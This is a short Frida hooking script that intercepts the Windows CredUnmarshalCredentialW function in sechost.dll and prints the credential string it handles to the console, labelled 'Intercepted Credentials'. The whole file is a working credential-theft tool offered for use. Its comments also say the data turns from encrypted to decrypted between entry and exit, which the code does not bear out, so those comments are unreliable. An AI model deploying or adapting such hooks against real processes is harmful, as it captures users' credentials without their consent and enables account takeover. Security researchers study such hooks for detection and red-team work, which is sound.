var encryptedCredential, decryptedCredential;
var credUnmarshalCredentialW = Module.findExportByName("sechost.dll", "CredUnmarshalCredentialW");


Interceptor.attach(credUnmarshalCredentialW, {
    onEnter: function (args)
	{
        // Credentials here are still encrypted
        encryptedCredential = args[0];
    },
    
	onLeave: function (result)
	{
        // Credentials are now decrypted
        decryptedCredential = encryptedCredential.readUtf16String()
        if (decryptedCredential)
		{
			console.log("\n[*] Intercepted Credentials: ");
			console.log("[+] Decrypted Credential: " + decryptedCredential);
        }
    }
});
